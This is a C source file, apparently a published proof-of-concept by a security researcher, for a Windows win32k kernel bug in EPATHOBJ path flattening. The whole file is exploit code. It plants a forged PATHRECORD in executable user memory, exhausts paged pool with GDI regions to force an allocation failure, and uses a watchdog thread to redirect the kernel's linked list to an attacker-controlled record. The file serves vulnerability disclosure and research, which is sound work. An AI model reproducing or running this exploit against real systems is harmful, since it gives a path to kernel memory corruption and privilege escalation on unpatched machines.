#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS
#endif
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <stddef.h>
#include <winnt.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>

#pragma comment(lib, "gdi32")
#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")

#define MAX_POLYPOINTS (8192 * 3)
#define MAX_REGIONS 8192
#define CYCLE_TIMEOUT 10000

//
// win32k!EPATHOBJ::pprFlattenRec uninitialized Next pointer testcase.
//
// Tavis Ormandy <taviso () cmpxchg8b com>, March 2013
//

POINT       Points[MAX_POLYPOINTS];
BYTE        PointTypes[MAX_POLYPOINTS];
HRGN        Regions[MAX_REGIONS];
ULONG       NumRegion;
HANDLE      Mutex;

// Log levels.
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;

BOOL LogMessage(LEVEL Level, PCHAR Format, ...);

// Copied from winddi.h from the DDK
#define PD_BEGINSUBPATH   0x00000001
#define PD_ENDSUBPATH     0x00000002
#define PD_RESETSTYLE     0x00000004
#define PD_CLOSEFIGURE    0x00000008
#define PD_BEZIERS        0x00000010

typedef struct  _POINTFIX
{
    ULONG x;
    ULONG y;
} POINTFIX, *PPOINTFIX;

// Approximated from reverse engineering.
typedef struct _PATHRECORD {
    struct _PATHRECORD *next;
    struct _PATHRECORD *prev;
    ULONG               flags;
    ULONG               count;
    POINTFIX            points[0];
} PATHRECORD, *PPATHRECORD;


PPATHRECORD PathRecord;
PATHRECORD  ExploitRecord;

DWORD WINAPI WatchdogThread(LPVOID Parameter)
{

    // This routine waits for a mutex object to timeout, then patches the
    // compromised linked list to point to an exploit. We need to do this.
    LogMessage(L_INFO, "Watchdog thread %u waiting on Mutex () %p",
                       GetCurrentThreadId(),
                       Mutex);

    if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT) {
        // It looks like the main thread is stuck in a call to FlattenPath(),
        // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean
        // up, and then patch the list to trigger our exploit.
        while (NumRegion--)
            DeleteObject(Regions[NumRegion]);

        LogMessage(L_ERROR, "InterlockedExchange(%p, %p);", &PathRecord->next, &ExploitRecord);

        InterlockedExchangePointer(&PathRecord->next, &ExploitRecord);

    } else {
        LogMessage(L_ERROR, "Mutex object did not timeout, list not patched");
    }

    return 0;
}

int main(int argc, char **argv)
{
    HANDLE      Thread;
    HDC         Device;
    ULONG       Size;
    HRGN        Buffer;
    ULONG       PointNum;
    ULONG       Count;

    // Create our PATHRECORD in userspace we will get added to the EPATHOBJ
    // pathrecord chain.
    PathRecord = VirtualAlloc(NULL,
                              sizeof(PATHRECORD),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);

    LogMessage(L_INFO, "Alllocated userspace PATHRECORD () %p", PathRecord);

    // Initialise with recognisable debugging values.
    FillMemory(PathRecord, sizeof(PATHRECORD), 0xCC);

    PathRecord->next    = PathRecord;
    PathRecord->prev    = (PVOID)(0x42424242);

    // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from
    // EPATHOBJ::bFlatten(). We don't set it so that we can trigger an infinite
    // loop in EPATHOBJ::bFlatten().
    PathRecord->flags   = 0;

    LogMessage(L_INFO, "  ->next  @ %p", PathRecord->next);
    LogMessage(L_INFO, "  ->prev  @ %p", PathRecord->prev);
    LogMessage(L_INFO, "  ->flags @ %u", PathRecord->flags);

    ExploitRecord.next  = NULL;
    ExploitRecord.prev  = 0xCCCCCCCC;
    ExploitRecord.flags = PD_BEZIERS;

    LogMessage(L_INFO, "Creating complex bezier path with %#x", (ULONG)(PathRecord) >> 4);

    // Generate a large number of Bezier Curves made up of pointers to our
    // PATHRECORD object.
    for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
        Points[PointNum].x      = (ULONG)(PathRecord) >> 4;
        Points[PointNum].y      = (ULONG)(PathRecord) >> 4;
        PointTypes[PointNum]    = PT_BEZIERTO;
    }

    // Switch to a dedicated desktop so we don't spam the visible desktop with
    // our Lines (Not required, just stops the screen from redrawing slowly).
    SetThreadDesktop(CreateDesktop("DontPanic",
                     NULL,
                     NULL,
                     0,
                     GENERIC_ALL,
                     NULL));

    Mutex = CreateMutex(NULL, TRUE, NULL);

    // Get a handle to this Desktop.
    Device = GetDC(NULL);

    // Spawn a thread to cleanup
    Thread = CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);

    // We need to cause a specific AllocObject() to fail to trigger the
    // exploitable condition. To do this, I create a large number of rounded
    // rectangular regions until they start failing. I don't think it matters
    // what you use to exhaust paged memory, there is probably a better way.
    //
    // I don't use the simpler CreateRectRgn() because it leaks a GDI handle on
    // failure. Seriously, do some damn QA Microsoft, wtf.

    for (Size = 1 << 26; Size; Size >>= 1) {
        while (Regions[NumRegion] = CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
            NumRegion++;
    }

    LogMessage(L_INFO, "Allocated %u HRGN objects", NumRegion);


    LogMessage(L_INFO, "Flattening curves...");

    // Begin filling the free list with our points.
    for (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3) {
        BeginPath(Device);
        PolyDraw(Device, Points, PointTypes, PointNum);
        EndPath(Device);
        FlattenPath(Device);
        FlattenPath(Device);
        EndPath(Device);
    }

    LogMessage(L_INFO, "No luck, cleaning up");

    // If we reach here, we didn't trigger the condition. Let the other thread know.
    ReleaseMutex(Mutex);

    ReleaseDC(NULL, Device);
    WaitForSingleObject(Thread, INFINITE);

    return 0;
}

// A quick logging routine for debug messages.
BOOL LogMessage(LEVEL Level, PCHAR Format, ...)
{
    CHAR Buffer[1024] = {0};
    va_list Args;

    va_start(Args, Format);
        vsnprintf_s(Buffer, sizeof Buffer, _TRUNCATE, Format, Args);
    va_end(Args);

    switch (Level) {
        case L_DEBUG: fprintf(stdout, "[?] %s\n", Buffer); break;
        case L_INFO:  fprintf(stdout, "[+] %s\n", Buffer); break;
        case L_WARN:  fprintf(stderr, "[*] %s\n", Buffer); break;
        case L_ERROR: fprintf(stderr, "[!] %s\n\a", Buffer); break;
    }

    fflush(stdout);
    fflush(stderr);

    return TRUE;
}
